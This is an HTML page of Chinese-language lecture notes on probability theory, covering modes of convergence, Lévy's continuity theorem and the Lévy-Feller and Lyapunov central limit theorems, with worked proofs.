<div class="arithmatex">\[ 
P\left( \frac{S_n - np}{\sqrt{np(1-p)}} \leqslant x \right) \approx \int_{-\infty}^{x} \frac{1}{\sqrt{2\pi}} e^{-\frac{t^2}{2}} \, dt 
\]</div>
<ul>
<li>
<p>左边：规范化 <span class="arithmatex">\(\frac{S_n - np}{\sqrt{np(1-p)}}\)</span> 随机变量的分布函数</p>
</li>
<li>
<p>右边：正态分布函数</p>
</li>
</ul>
<div class="arithmatex">\[
\Phi(x) = \int_{-\infty}^{x} \frac{1}{\sqrt{2\pi}} e^{-\frac{t^2}{2}} \, dt
\]</div>
<ul>
<li></li>
</ul>
<div class="arithmatex">\[
P(a \leqslant S_n \leqslant b) = P\left( \frac{a - np}{\sqrt{np(1-p)}} \leqslant \frac{S_n - np}{\sqrt{np(1-p)}} \leqslant \frac{b - np}{\sqrt{np(1-p)}} \right) 
\approx \Phi\left( \frac{b - np}{\sqrt{np(1-p)}} \right) - \Phi\left( \frac{a - np}{\sqrt{np(1-p)}} \right)
\]</div>
<div class="admonition idea">
<p class="admonition-title">利用De Moivre-Laplace定理证明</p>
<p>在伯努利试验中，若<span class="arithmatex">\(p \in (0, 1)\)</span>，则不管<span class="arithmatex">\(A\)</span>是多大的常数，总有</p>
<div class="arithmatex">\[
    P(\lvert \mu_n - np \rvert &lt; A) \to 0, \quad n \to \infty
\]</div>
<p>将其化为标准形式，则</p>
<div class="arithmatex">\[
    P(\lvert \dfrac{\mu_n - np}{\sqrt{np(1-p)}} \rvert &lt; \frac{A}{\sqrt{np(1-p)}})\to 0, \quad n \to \infty
\]</div>
<p>由De Moivre-Laplace定理，右边是趋向于0,所以原概率相当于</p>
<div class="arithmatex">\[
    P(|X|  &lt;  0)  = 2  \Phi(0) - 1 = 0
\]</div>
<p>其中 <span class="arithmatex">\(X\)</span> 是标准正态分布</p>
<p><strong>但是，这一结果是否与大数定律相矛盾呢，直观上理解有些困难，但是，我们将其化为大数定律的形式来看的话，就有</strong></p>
<div class="arithmatex">\[
    P(\lvert \dfrac{\mu_n}{n} - p \rvert &lt; \dfrac{A}{n}) \to 0, \quad n \to \infty
\]</div>
<p>但是大数定律的结论是,对于任意给定的<span class="arithmatex">\(\epsilon &gt; 0\)</span>,总有</p>
<div class="arithmatex">\[
    P(\lvert \dfrac{\mu_n}{n} - p \rvert &gt; \epsilon) \to 0, \quad n \to \infty
\]</div>
<p>那么结果就很明了了，大数定律需要<span class="arithmatex">\(\epsilon\)</span>给定,但是这里的<span class="arithmatex">\(\dfrac{A}{n}\)</span>是与<span class="arithmatex">\(n\)</span>有关一直变化的，并不满足大数定律的条件，所以，大数定律与这个结论并不矛盾，关键就在于<span class="arithmatex">\(A\)</span>是给定的常数导致它除以<span class="arithmatex">\(n\)</span>后，<span class="arithmatex">\(\epsilon\)</span>是变化的。</p>
</div>
<h2 id="note-probability-fourth-_3">依概率收敛<a class="headerlink" href="#note-probability-fourth-_3" title="Permanent link">&para;</a></h2>
<p><span class="arithmatex">\((\Omega, \mathcal{S}, P)\)</span> 是一个概率空间，<span class="arithmatex">\(X, X_n, n \geqslant 1\)</span> 是一列随机变量，如果对任意 <span class="arithmatex">\(\epsilon &gt; 0\)</span>,</p>
<div class="arithmatex">\[
P(\omega : |X_n(\omega) - X(\omega)| &gt; \epsilon) \to 0, \quad n \to \infty
\]</div>
<p>称 <span class="arithmatex">\(X_n\)</span> 依概率收敛到 <span class="arithmatex">\(X\)</span>，记做 <span class="arithmatex">\(X_n \xrightarrow{P} X\)</span>。</p>
<p>按此概念，Bernoulli 大数律可写成</p>
<div class="arithmatex">\[
\frac{S_n}{n} \xrightarrow{P} p
\]</div>
<div class="admonition property">
<p class="admonition-title">依概率收敛的性质</p>
<div class="tabbed-set tabbed-alternate" data-tabs="1:4"><input checked="checked" id="note-probability-fourth-_3-极限唯一性" name="note-probability-fourth-__tabbed_1" type="radio" /><input id="note-probability-fourth-_3-依概率收敛的判别法则" name="note-probability-fourth-__tabbed_1" type="radio" /><input id="note-probability-fourth-_3-运算性质" name="note-probability-fourth-__tabbed_1" type="radio" /><input id="note-probability-fourth-_3-连续映射保依概率收敛" name="note-probability-fourth-__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="note-probability-fourth-_3-极限唯一性">极限唯一性</label><label for="note-probability-fourth-_3-依概率收敛的判别法则">依概率收敛的判别法则</label><label for="note-probability-fourth-_3-运算性质">运算性质</label><label for="note-probability-fourth-_3-连续映射保依概率收敛">连续映射保依概率收敛</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p>如果 <span class="arithmatex">\(X_n \xrightarrow{P} X\)</span> 且 <span class="arithmatex">\(X_n \xrightarrow{P} Y\)</span>，那么 </p>
<div class="arithmatex">\[
    P(X=Y) = 1
\]</div>
<details class="proof">
<summary>证明</summary>
<div class="arithmatex">\[
\text{证明: 只需证明 } P(X \neq Y) = 0. \text{ 注意到,}
\]</div>
<div class="arithmatex">\[
P(X \neq Y) = P(|X - Y| &gt; 0) = P(\cup_{m=1}^{\infty}\{ |X - Y| &gt; \frac{1}{m} \})
\]</div>
<p>因此, 需要证明对任意 <span class="arithmatex">\(\epsilon &gt; 0\)</span>,</p>
<div class="arithmatex">\[
P(|X - Y| &gt; \epsilon) = 0
\]</div>
<p>给定 <span class="arithmatex">\(\epsilon &gt; 0\)</span>, 对任意 <span class="arithmatex">\(n \geqslant 1\)</span></p>
<div class="arithmatex">\[
P(|X - Y| &gt; \epsilon) = P(|(X_n - X) - (X_n - Y)| &gt; \epsilon)
\]</div>
<div class="arithmatex">\[
\leqslant P(|X_n - X| + |X_n - Y| &gt; \epsilon)
\]</div>
<p>这里运用了三角不等式，小的发生，大的一定也发生；</p>
<div class="arithmatex">\[
\leqslant P(|X_n - X| &gt; \frac{\epsilon}{2}) + P(|X_n - Y| &gt; \frac{\epsilon}{2})
\]</div>
<p>这里是因为</p>
<div class="arithmatex">\[
    \{a+b&gt;c\} \subset \{a&gt;\frac{c}{2}\} \cup \{b&gt;\frac{c}{2}\}
\]</div>
<p>令 <span class="arithmatex">\(n \to \infty\)</span>,</p>
<div class="arithmatex">\[
P(|X_n - X| &gt; \frac{\epsilon}{2}) \to 0, \quad P(|X_n - Y| &gt; \frac{\epsilon}{2}) \to 0
\]</div>
<p>因此</p>
<div class="arithmatex">\[
P(|X - Y| &gt; \epsilon) = 0
\]</div>
<div class="arithmatex">\[
\text{因此, } P(X = Y) = 1
\]</div>
</details>
</div>
<div class="tabbed-block">
<p>如果存在某 <span class="arithmatex">\(r &gt; 0\)</span>, 成立</p>
<div class="arithmatex">\[
E|X_n - X|^r \to 0, \quad n \to \infty
\]</div>
<p>那么</p>
<div class="arithmatex">\[
X_n \xrightarrow{P} X
\]</div>
</div>
<div class="tabbed-block">
<p>如果 <span class="arithmatex">\(X_n \xrightarrow{P} X, Y_n \xrightarrow{P} Y\)</span>, 那么</p>
<p>(i) <span class="arithmatex">\(X_n \pm Y_n \xrightarrow{P} X \pm Y\)</span></p>
<p>(ii) <span class="arithmatex">\(X_n \cdot Y_n \xrightarrow{P} X \cdot Y\)</span></p>
<p>(iii) 如果 <span class="arithmatex">\(P(Y \neq 0) = 1\)</span>, 那么 <span class="arithmatex">\(\frac{X_n}{Y_n} \xrightarrow{P} \frac{X}{Y}\)</span></p>
</div>
<div class="tabbed-block">
<p>假设 <span class="arithmatex">\(f: \mathbb{R} \mapsto \mathbb{R}\)</span> 是连续映射，如果 <span class="arithmatex">\(X_n \xrightarrow{P} X\)</span>，那么</p>
<div class="arithmatex">\[
f(X_n) \xrightarrow{P} f(X)
\]</div>
<details class="proof">
<summary>证明</summary>
<p>设 <span class="arithmatex">\(\epsilon' &gt; 0\)</span>，存在 <span class="arithmatex">\(M &gt; 0\)</span>，使得</p>
<div class="arithmatex">\[
P(|\xi| \geqslant M) \leqslant  P(|\xi| \geqslant \frac{M}{2})  \leqslant \frac{\epsilon'}{4}
\]</div>
<p>由于 <span class="arithmatex">\(\xi_n \xrightarrow{P} \xi\)</span>，故存在 <span class="arithmatex">\(N_1 \geqslant 1\)</span>，当 <span class="arithmatex">\(n \geqslant N_1\)</span> 时，<span class="arithmatex">\(P(|\xi_n - \xi| \geqslant \frac{M}{2}) \leqslant \frac{\epsilon'}{4}\)</span>。因此</p>
<div class="arithmatex">\[
P(|\xi_n| \geqslant M) \leqslant P(|\xi_n - \xi| \geqslant \frac{M}{2}) + P(|\xi| \geqslant \frac{M}{2}) \leqslant \frac{\epsilon'}{2}
\]</div>
<p>又因 <span class="arithmatex">\(f(x)\)</span> 在 <span class="arithmatex">\((-\infty, \infty)\)</span> 上连续，从而在 <span class="arithmatex">\([-M, M]\)</span> 上一致连续。对给定的 <span class="arithmatex">\(\epsilon &gt; 0\)</span>，存在 <span class="arithmatex">\(\delta &gt; 0\)</span>，当 <span class="arithmatex">\(|x - y| &lt; \delta\)</span> 时，<span class="arithmatex">\(|f(x) - f(y)| &lt; \epsilon\)</span>。这样</p>
<div class="arithmatex">\[
P(|f(\xi_n) - f(\xi)| \geqslant \epsilon) \leqslant P(|\xi_n - \xi| \geqslant \delta) + P(|\xi_n| \geqslant M) + P(|\xi| \geqslant M)
\]</div>
<p>对上述的 <span class="arithmatex">\(\delta\)</span>，存在 <span class="arithmatex">\(N_2 \geqslant 1\)</span>，当 <span class="arithmatex">\(n \geqslant N_2\)</span> 时，</p>
<div class="arithmatex">\[
P(|\xi_n - \xi| \geqslant \delta) \leqslant \frac{\epsilon'}{4}
\]</div>
<p>当 <span class="arithmatex">\(n \geqslant \max(N_1, N_2)\)</span> 时，</p>
<div class="arithmatex">\[
P(|f(\xi_n) - f(\xi)| \geqslant \epsilon) \leqslant \frac{\epsilon'}{4} + \frac{\epsilon'}{2} + \frac{\epsilon'}{4} = \epsilon'
\]</div>
</details>
</div>
</div>
</div>
</div>
<h2 id="note-probability-fourth-_4">依分布收敛<a class="headerlink" href="#note-probability-fourth-_4" title="Permanent link">&para;</a></h2>
<p>假设 <span class="arithmatex">\((\Omega, \Sigma, P)\)</span> 是概率空间，<span class="arithmatex">\(X, X_n, n \geqslant 1\)</span> 是一列随机变量，<span class="arithmatex">\(F, F_n, n \geqslant 1\)</span> 是一列相应的分布函数，如果对于 <span class="arithmatex">\(F\)</span> 的任意连续点 <span class="arithmatex">\(x\)</span>,</p>
<div class="arithmatex">\[
F_n(x) \to F(x), \quad n \to \infty
\]</div>
<p>称 <span class="arithmatex">\(F_n\)</span> 依分布收敛于 <span class="arithmatex">\(F\)</span>，记 <span class="arithmatex">\(F_n \xrightarrow{d} F\)</span> 或者 <span class="arithmatex">\(X_n \xrightarrow{d} X\)</span>。</p>
<p>按此概念，中心极限定理可写成</p>
<div class="arithmatex">\[
\frac{S_n - np}{\sqrt{np(1-p)}} \xrightarrow{d} N(0, 1)
\]</div>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<ul>
<li>
<p>如果 <span class="arithmatex">\( F \)</span> 是在 <span class="arithmatex">\(\mathbb{R}\)</span> 上连续, 那么 <span class="arithmatex">\( F_n \)</span> 处处收敛到 <span class="arithmatex">\( F \)</span></p>
</li>
<li>
<p>一般地,<span class="arithmatex">\( F \)</span>不是连续函数(左极限存在，右连续的函数)</p>
</li>
<li>
<p>既然 <span class="arithmatex">\(F\)</span> 是单调有界函数，<span class="arithmatex">\(F\)</span> 的不连续点集最多可数个：</p>
</li>
</ul>
<div class="arithmatex">\[
  D_F = \{x : F(x) - F(x-) &gt; 0\} = \bigcup_{n=1}^{\infty} \left\{x : F(x) - F(x-) \geqslant \frac{1}{n}\right\}
\]</div>
<ul>
<li><span class="arithmatex">\(F\)</span> 的连续性点集在 <span class="arithmatex">\(\mathbb{R}\)</span> 上稠密。</li>
</ul>
</div>
<div class="admonition info">
<p class="admonition-title">依概率收敛与依分布收敛的关系</p>
<div class="tabbed-set tabbed-alternate" data-tabs="2:3"><input checked="checked" id="note-probability-fourth-_4-依概率收敛意味着依分布收敛" name="note-probability-fourth-__tabbed_2" type="radio" /><input id="note-probability-fourth-_4-依分布收敛并不意味着依概率收敛" name="note-probability-fourth-__tabbed_2" type="radio" /><input id="note-probability-fourth-_4-依分布收敛的判别法则" name="note-probability-fourth-__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="note-probability-fourth-_4-依概率收敛意味着依分布收敛">依概率收敛意味着依分布收敛</label><label for="note-probability-fourth-_4-依分布收敛并不意味着依概率收敛">依分布收敛并不意味着依概率收敛</label><label for="note-probability-fourth-_4-依分布收敛的判别法则">依分布收敛的判别法则</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p>证明的关键在于构造夹逼项;</p>
<p>如果 <span class="arithmatex">\( \xi_n \xrightarrow{P} \xi \)</span>，那么 <span class="arithmatex">\( \xi_n \xrightarrow{d} \xi \)</span></p>
<p>假设 <span class="arithmatex">\(F\)</span> 和 <span class="arithmatex">\(F_n\)</span> 分别是 <span class="arithmatex">\(\xi\)</span> 和 <span class="arithmatex">\(\xi_n\)</span> 的分布函数，那么对任意给定 <span class="arithmatex">\(\epsilon &gt; 0\)</span>，有</p>
<div class="arithmatex">\[
    (\xi \leqslant x - \epsilon) = (\xi \leqslant x - \epsilon, \xi_n \leqslant x) \cup (\xi \leqslant x - \epsilon, \xi_n &gt; x) \subset (\xi_n \leqslant x) \cup (\xi_n - \xi &gt; \epsilon)
\]</div>
<p>因此</p>
<div class="arithmatex">\[
    F(x - \epsilon) \leqslant F_n(x) + P(\xi_n - \xi &gt; \epsilon)
\]</div>
<p>令 <span class="arithmatex">\(n \to \infty\)</span>，由于 <span class="arithmatex">\(P(\xi_n - \xi &gt; \epsilon) \to 0\)</span>，所以</p>
<div class="arithmatex">\[
    F(x - \epsilon) \leqslant \inf_{n \to \infty} F_n(x) 
\]</div>
<p>同理</p>
<div class="arithmatex">\[
    (\xi_n \leqslant x) \subset (\xi \leqslant x + \epsilon) \cup (\xi - \xi_n &lt; -\epsilon)
\]</div>
<p>从而</p>
<div class="arithmatex">\[
    F(x + \epsilon) \geqslant \sup_{n \to \infty} F_n(x)
\]</div>
<p>因此</p>
<div class="arithmatex">\[
    \lim_{n \to \infty} F_n(x) = F(x)
\]</div>
</div>
<div class="tabbed-block">
<p>但是如果 <span class="arithmatex">\(X_n \xrightarrow{d} C\)</span>，那么 <span class="arithmatex">\(X_n \xrightarrow{P} C\)</span></p>
<p>其中 <span class="arithmatex">\(C\)</span> 是常数</p>
<p>如果 <span class="arithmatex">\(\xi_n \xrightarrow{d} c\)</span>，则</p>
<div class="arithmatex">\[
\lim_{n \to \infty} F_n(x) = 
\begin{cases} 
0, &amp; x &lt; c, \\
1, &amp; x \geqslant c.
\end{cases}
\]</div>
<p>因此对任意 <span class="arithmatex">\(\epsilon &gt; 0\)</span>，有</p>
<div class="arithmatex">\[
P(|\xi_n - c| \geqslant \epsilon) = P(\xi_n \geqslant c + \epsilon) + P(\xi_n \leqslant c - \epsilon)
\]</div>
<div class="arithmatex">\[
= 1 - P(\xi_n &lt; c + \epsilon) + P(\xi_n \leqslant c - \epsilon)
\]</div>
<div class="arithmatex">\[
= 1 - F_n(c + \epsilon - 0) + F_n(c - \epsilon) \to 0.
\]</div>
<p>定理证毕。</p>
</div>
<div class="tabbed-block"></div>
</div>
</div>
<ul>
<li>
<p>Levy 连续性定理:</p>
<p>假设 <span class="arithmatex">\(X, X_n, n \geqslant 1\)</span> 是一列随机变量，具有特征函数 <span class="arithmatex">\(\phi, \phi_n, n \geqslant 1\)</span>。那么</p>
<div class="arithmatex">\[
  X_n \xrightarrow{d} X \iff \phi_n(t) \to \phi(t), \quad t \in \mathbb{R}
\]</div>
</li>
<li>
<p>Levy 连续性定理的另一种形式:</p>
<p>假设 <span class="arithmatex">\(X_n, n \geqslant 1\)</span> 是一列随机变量，具有特征函数 <span class="arithmatex">\(\phi_n, n \geqslant 1\)</span>。如果</p>
<div class="arithmatex">\[
  \phi_n(t) \to \phi(t), \quad t \in \mathbb{R}
\]</div>
<p>并且 <span class="arithmatex">\(\phi\)</span> 在 0 处连续，那么 <span class="arithmatex">\(\phi\)</span> 一定是特征函数。记与 <span class="arithmatex">\(\phi\)</span> 相应的随机变量为 <span class="arithmatex">\(X\)</span>，那么</p>
<div class="arithmatex">\[
  X_n \xrightarrow{d} X
\]</div>
</li>
</ul>
</div>
<p>运用Levy定理，如果要证明一列随机变量依分布收敛于某个随机变量，只需要证明这列随机变量的特征函数收敛于该随机变量的特征函数。</p>
<div class="admonition example">
<p class="admonition-title">应用</p>
<div class="tabbed-set tabbed-alternate" data-tabs="3:2"><input checked="checked" id="note-probability-fourth-_4-辛钦大数律证明" name="note-probability-fourth-__tabbed_3" type="radio" /><input id="note-probability-fourth-_4-levy-feller中心极限定理证明" name="note-probability-fourth-__tabbed_3" type="radio" /><div class="tabbed-labels"><label for="note-probability-fourth-_4-辛钦大数律证明">辛钦大数律证明</label><label for="note-probability-fourth-_4-levy-feller中心极限定理证明">Levy-Feller中心极限定理证明</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p>回忆 <span class="arithmatex">\(\xi_k, k \geqslant 1\)</span> 独立同分布，<span class="arithmatex">\(E\xi_k = \mu\)</span>，那么</p>
<div class="arithmatex">\[
\frac{1}{n} \sum_{k=1}^{n} \xi_k \xrightarrow{p} \mu
\]</div>
<p>证明：只需证明</p>
<div class="arithmatex">\[
X_n = \frac{1}{n} \sum_{k=1}^{n} \xi_k \xrightarrow{d} \mu
\]</div>
<div class="arithmatex">\[
\iff \quad \phi_n(t) = E e^{itX_n} \to e^{it\mu}
\]</div>
<p>在 0 处进行 Taylor 展开，</p>
<div class="arithmatex">\[
E e^{it\xi_k} = 1 + it\mu + o\left(\frac{1}{n}\right), \quad n \to \infty
\]</div>
<p>所以，对每个 <span class="arithmatex">\(t \in \mathbb{R}\)</span>,</p>
<div class="arithmatex">\[
\phi_n(t) = \left(1 + \frac{it\mu}{n} + o\left(\frac{1}{n}\right)\right)^n \to e^{it\mu}
\]</div>
</div>
<div class="tabbed-block">
<p>回忆 <span class="arithmatex">\(\xi_k, k \geqslant 1\)</span> 独立同分布，<span class="arithmatex">\(E\xi_k = \mu, \operatorname{Var}(\xi_k) = \sigma^2\)</span>，那么</p>
<div class="arithmatex">\[
X_n = \frac{1}{\sigma \sqrt{n}} \sum_{k=1}^{n} (\xi_k - \mu) \xrightarrow{d} N(0, 1)
\]</div>
<p>证明：只需证明</p>
<div class="arithmatex">\[
\phi_n(t) = E e^{itX_n} \to e^{-\frac{t^2}{2}}
\]</div>
<p>注意到</p>
<div class="arithmatex">\[
E e^{itX_n} = \left[E e^{i\frac{t(\xi_k - \mu)}{\sigma \sqrt{n}}}\right]^n
\]</div>
<p>在 0 处进行 Taylor 展开，</p>
<div class="arithmatex">\[
E e^{i\frac{t(\xi_k - \mu)}{\sigma \sqrt{n}}} = 1 - \frac{t^2}{2n} + o\left(\frac{1}{n}\right)
\]</div>
<p>所以，对任意 <span class="arithmatex">\(t\)</span>,</p>
<div class="arithmatex">\[
E e^{itX_n} = \left[1 - \frac{t^2}{2n} + o\left(\frac{1}{n}\right)\right]^n \to e^{-\frac{t^2}{2}}
\]</div>
</div>
</div>
</div>
</div>
<div class="admonition property">
<p class="admonition-title">依分布收敛的性质</p>
<ul>
<li>
<ul>
<li>如果 <span class="arithmatex">\(X_n \xrightarrow{d} X\)</span>，<span class="arithmatex">\(a_n,b_n \rightarrow a,b\)</span>，那么 <span class="arithmatex">\(a_nX_n + b_n \xrightarrow{d} aX + b\)</span></li>
</ul>
<p>线性性:</p>
<ul>
<li>如果 <span class="arithmatex">\(X_n \xrightarrow{d} X\)</span>，<span class="arithmatex">\(Y_n \xrightarrow{P} Y\)</span>，那么 <span class="arithmatex">\(X_n Y_n \xrightarrow{d} X Y\)</span></li>
</ul>
</li>
<li>
<p>连续映射保依分布收敛:</p>
<ul>
<li>如果 <span class="arithmatex">\(X_n \xrightarrow{d} X\)</span>，且 <span class="arithmatex">\(f: \mathbb{R} \mapsto \mathbb{R}\)</span> 是连续映射，那么 <span class="arithmatex">\(f(X_n) \xrightarrow{d} f(X)\)</span></li>
</ul>
</li>
</ul>
<div class="admonition proof">
<p class="admonition-title">Helly引理</p>
<p>假设 <span class="arithmatex">\(F, F_n, n \geq 1\)</span> 是一列分布函数，并且 <span class="arithmatex">\(F_n \xrightarrow{d} F\)</span>，那么对任意有界连续函数 <span class="arithmatex">\(g\)</span></p>
<div class="arithmatex">\[
\int g(x) dF_n(x) \to \int g(x) dF(x)
\]</div>
<p>这样，对任意 <span class="arithmatex">\(t \in \mathbb{R}\)</span>,</p>
<div class="arithmatex">\[
E e^{itf(X_n)} = \int e^{itf(x)} dF_n(x)
\]</div>
<div class="arithmatex">\[
\to \int e^{itf(x)} dF(x)
\]</div>
<div class="arithmatex">\[
= E e^{itf(X)}
\]</div>
<p>结论成立</p>
</div>
</div>
<div class="card file-block">
<div class="file-icon"><img src="../NOTE/Probability/pdf.svg" style="height: 3em;"></div>
<div class="file-body">
<div class="file-title">线性性的手写证明</div>
<div class="file-meta"></div>
</div>
<p><a class="down-button" target="_blank" href="../NOTE/Probability/prob.pdf"  markdown="1"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M288 32c0-17.7-14.3-32-32-32s-32 14.3-32 32v242.7l-73.4-73.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l128 128c12.5 12.5 32.8 12.5 45.3 0l128-128c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L288 274.7zM64 352c-35.3 0-64 28.7-64 64v32c0 35.3 28.7 64 64 64h384c35.3 0 64-28.7 64-64v-32c0-35.3-28.7-64-64-64H346.5l-45.3 45.3c-25 25-65.5 25-90.5 0L165.5 352zm368 56a24 24 0 1 1 0 48 24 24 0 1 1 0-48"/></svg></span> 查看</a></p>
</div>
<div class="admonition idea">
<p class="admonition-title">心得</p>
<p>在证明这些性质时常用的放缩有</p>
<ul>
<li>
<p><span class="arithmatex">\(P( a &lt; A) \leqslant P( b &lt; A ) (b&lt;a)\)</span> 大的发生(小于A)，小的一定也发生</p>
</li>
<li>
<p><span class="arithmatex">\(P(a &gt; A) \leqslant P(b &gt; A) (b &gt; a)\)</span> 小的发生(大于A)，大的一定也发生</p>
</li>
<li>
<p><span class="arithmatex">\(P(A_n) \leqslant P(A_n,B_n)+P(A_n,B_n^c)\)</span>,至少有一个发生</p>
</li>
<li>
<p><span class="arithmatex">\(P(A_n) \geqslant P(A_n,B_n)\)</span> 条件加强，概率变小,反过来使用就是条件减弱，概率变大</p>
</li>
</ul>
</div>
<h2 id="note-probability-fourth-levy-feller">Levy-Feller 中心极限定理<a class="headerlink" href="#note-probability-fourth-levy-feller" title="Permanent link">&para;</a></h2>
<ul>
<li>Levy-Feller 中心极限定理</li>
</ul>
<p>假设 <span class="arithmatex">\(\xi_k, k \geqslant 1\)</span> 是一列独立同分布随机变量，<span class="arithmatex">\(E\xi_k = \mu, \operatorname{Var}(\xi_k) = \sigma^2\)</span>。记 <span class="arithmatex">\(S_n = \sum_{k=1}^{n} \xi_k\)</span>，那么对任意 <span class="arithmatex">\(x\)</span>,</p>
<div class="arithmatex">\[
P\left( \frac{S_n - n\mu}{\sigma \sqrt{n}} \leqslant x \right) \to \Phi(x)
\]</div>
<p>即</p>
<div class="arithmatex">\[
\frac{S_n - n\mu}{\sigma \sqrt{n}} \xrightarrow{d} N(0, 1)
\]</div>
<div class="admonition note">
<p class="admonition-title">Levy-Feller 中心极限定理的意义</p>
<ul>
<li>
<p>应用于一般随机变量，推广了 de Moivre-Laplace 中心极限定理。</p>
</li>
<li>
<p>说明测量误差可用正态分布描述，即正态分布无处不在。</p>
</li>
</ul>
<p>假设测量值为 <span class="arithmatex">\(X_i\)</span>，真值为 <span class="arithmatex">\(\mu\)</span>。每次误差为 <span class="arithmatex">\(X_i - \mu\)</span>，<span class="arithmatex">\(n\)</span> 次观测所得误差叠加，记为 <span class="arithmatex">\(\sum_{i=1}^{n}(X_i - \mu)\)</span>。那么</p>
<div class="arithmatex">\[
\sum_{i=1}^{n}(X_i - \mu) \sim N(0, n\sigma^2), \quad n \gg 1
\]</div>
</div>
<h2 id="note-probability-fourth-lyapunov">Lyapunov 中心极限定理<a class="headerlink" href="#note-probability-fourth-lyapunov" title="Permanent link">&para;</a></h2>
<p>假设 <span class="arithmatex">\(\xi_k, k \geqslant 1\)</span> 是一列独立随机变量<mark class="critic">不一定同分布</mark>，<span class="arithmatex">\(E\xi_k = \mu_k\)</span>，<span class="arithmatex">\(\operatorname{Var}(\xi_k) = \sigma_k^2\)</span>。记 <span class="arithmatex">\(S_n = \sum_{k=1}^{n} \xi_k\)</span>，<span class="arithmatex">\(B_n = \sum_{k=1}^{n} \sigma_k^2\)</span>。如果</p>
<ol>
<li><span class="arithmatex">\(B_n \to \infty\)</span></li>
<li><span class="arithmatex">\(E|\xi_k|^3 &lt; \infty\)</span>，且</li>
</ol>
<div class="arithmatex">\[
\frac{1}{B_n^{3/2}} \sum_{k=1}^{n} E|\xi_k - \mu_k|^3 \to 0, \quad n \to \infty
\]</div>
<p>那么对任意 <span class="arithmatex">\(x\)</span></p>
<div class="arithmatex">\[
P\left(\frac{\sum_{k=1}^{n} (\xi_k - \mu_k)}{\sqrt{B_n}} \leqslant x\right) \to \Phi(x)
\]</div>
<p>即</p>
<div class="arithmatex">\[
\frac{\sum_{k=1}^{n} (\xi_k - \mu_k)}{\sqrt{B_n}} \xrightarrow{d} N(0, 1)
\]</div>
<div class="admonition note">
<p class="admonition-title">Lyapunov 中心极限定理的意义</p>
<ul>
<li>
<p>推广了 Levy-Feller 中心极限定理。</p>
</li>
<li>
<p>解决了不同分布的随机变量和的中心极限问题。</p>
</li>
<li>
<p>Lyapunov  条件可以推出 Lindeberg 条件</p>
</li>
</ul>
<div class="admonition info">
<p class="admonition-title">Lindeberg 条件</p>
<p>假设 <span class="arithmatex">\(\{\xi_n\}\)</span> 是独立随机变量序列，<span class="arithmatex">\(F_k\)</span> 为对应分布函数，且每个变量有有限期望和方差 <span class="arithmatex">\(a_k, \sigma_k^2\)</span>。</p>
<p>记 <span class="arithmatex">\(B_n^2 = \sum_{k=1}^{n} \sigma_k^2\)</span>。</p>
<p>Lindeberg 条件为：</p>
<div class="arithmatex">\[
\lim_{n \to \infty} \frac{1}{B_n^2} \sum_{k=1}^{n} \int_{|x-a_k| \geq \epsilon B_n} (x-a_k)^2 dF_k(x) = 0
\]</div>
</div>
</div>
<h2 id="note-probability-fourth-_5">几乎处处收敛<a class="headerlink" href="#note-probability-fourth-_5" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">几乎处处收敛</p>
<ul>
<li><strong>处处收敛</strong>: 假设 <span class="arithmatex">\((\Omega, \mathcal{A}, P)\)</span> 是一个概率空间，<span class="arithmatex">\(X, X_n, n \geqslant 1\)</span> 是一列随机变量，如果对每个 <span class="arithmatex">\(\omega \in \Omega\)</span>,</li>
</ul>
<div class="arithmatex">\[
  X_n(\omega) \to X(\omega), \quad n \to \infty
\]</div>
<p>那么称 <span class="arithmatex">\(X_n\)</span> 处处收敛于 <span class="arithmatex">\(X\)</span>。</p>
<ul>
<li><strong>几乎处处收敛</strong>: 假设 <span class="arithmatex">\((\Omega, \mathcal{A}, P)\)</span> 是一个概率空间，<span class="arithmatex">\(X, X_n, n \geqslant 1\)</span> 是一列随机变量，如果存在 <span class="arithmatex">\(\Omega_0 \subset \Omega\)</span> 使得</li>
</ul>
<p>(i) <span class="arithmatex">\(P(\Omega_0) = 0\)</span></p>
<p>(ii) 对每个 <span class="arithmatex">\(\omega \in \Omega \setminus \Omega_0\)</span>,</p>
<div class="arithmatex">\[
  X_n(\omega) \to X(\omega), \quad n \to \infty
\]</div>
<p>那么称 <span class="arithmatex">\(X_n\)</span> 几乎处处收敛于 <span class="arithmatex">\(X\)</span>，记做 <span class="arithmatex">\(X_n \to X, a.s.\)</span>。</p>
<p>即除一个零概率事件外，<span class="arithmatex">\(X_n\)</span> 处处收敛于 <span class="arithmatex">\(X\)</span>。</p>
</div>
<div class="admonition quote">
<p class="admonition-title">Quote</p>
<p>对于几乎处处收敛和依概率收敛，两者的区别是依概率收敛先计算概率，再要求概率为1，而几乎处处收敛要求每一个样本空间的点的映射都收敛。</p>
<p>详情可以参考这篇文章<a href="https://zhuanlan.zhihu.com/p/439010146">几乎处处收敛与依概率收敛的区别</a></p>
</div>
<h3 id="note-probability-fourth-_6">几乎处处收敛的判别法则<a class="headerlink" href="#note-probability-fourth-_6" title="Permanent link">&para;</a></h3>
<p><span class="arithmatex">\(X_n \to X, \ a.s.\)</span></p>
<p>当且仅当对任意 <span class="arithmatex">\(\epsilon &gt; 0\)</span>,</p>
<div class="arithmatex">\[
P\left(\bigcap_{N=1}^{\infty} \bigcup_{n=N}^{\infty} \{|X_n(\omega) - X(\omega)| &gt; \epsilon\}\right) = 0
\]</div>
<p>或者说</p>
<div class="arithmatex">\[
P(\{|X_n(\omega) - X(\omega)| &gt; \epsilon\}, \ i.o.) = 0(i.o.表示无限次)
\]</div>
<p>等价地, 对任意 <span class="arithmatex">\(\epsilon &gt; 0\)</span>,</p>
<div class="arithmatex">\[
\lim_{N \to \infty} P\left(\bigcup_{n=N}^{\infty} \{|X_n(\omega) - X(\omega)| &gt; \epsilon\}\right) = 0
\]</div>
<p>由此, 也可看出几乎处处收敛比依概率收敛强。</p>
